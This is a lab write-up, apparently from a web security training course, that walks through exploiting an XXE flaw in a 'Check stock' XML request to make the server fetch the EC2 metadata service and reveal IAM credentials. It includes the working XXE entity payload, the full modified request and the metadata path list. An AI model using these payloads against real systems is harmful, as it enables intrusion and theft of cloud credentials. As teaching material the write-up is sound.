# Lab: Exploiting XXE to Perform SSRF Attacks

## Description

This lab contains a "Check stock" feature that accepts XML input and reflects unexpected values in the response. The application is vulnerable to XML External Entity (XXE) injection. The objective is to leverage the XXE vulnerability to perform a Server-Side Request Forgery (SSRF) attack and retrieve the IAM Secret Access Key from the EC2 metadata service running at `http://169.254.169.254/`.

## Vulnerability Overview

The application processes user-supplied XML without disabling external entity resolution. By defining an external entity that points to an internal resource, an attacker can force the server to make HTTP requests on their behalf. In cloud environments, this may allow access to metadata services containing sensitive information such as IAM credentials.

## Exploitation Steps

1. Navigate to any product page.
2. Click **Check stock**.
3. Intercept the POST request using Burp Suite.
4. Insert the following DOCTYPE declaration between the XML declaration and the `<stockCheck>` element:

```xml id="jlwmc0"
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
```

5. Replace the value of the `<productId>` element with the external entity reference:

```xml id="hvwfh4"
&xxe;
```

The modified request becomes:

```xml id="y5uj7o"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

6. Forward the request and observe the response. The server returns the contents of the metadata endpoint.

7. Enumerate the available paths by updating the URL in the external entity:

```text id="zwh1pb"
http://169.254.169.254/
↓
http://169.254.169.254/latest
↓
http://169.254.169.254/latest/meta-data
↓
http://169.254.169.254/latest/meta-data/iam
↓
http://169.254.169.254/latest/meta-data/iam/security-credentials
↓
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```

8. Requesting the final endpoint returns JSON containing AWS credentials, including the Secret Access Key.

## Result

The XXE vulnerability was successfully exploited to perform SSRF against the EC2 metadata service. By traversing the metadata API, sensitive IAM credentials were disclosed.

Example response:

```json id="vbyx3g"
{
  "Code": "Success",
  "LastUpdated": "...",
  "Type": "AWS-HMAC",
  "AccessKeyId": "...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

The retrieved `SecretAccessKey` was used to solve the lab.

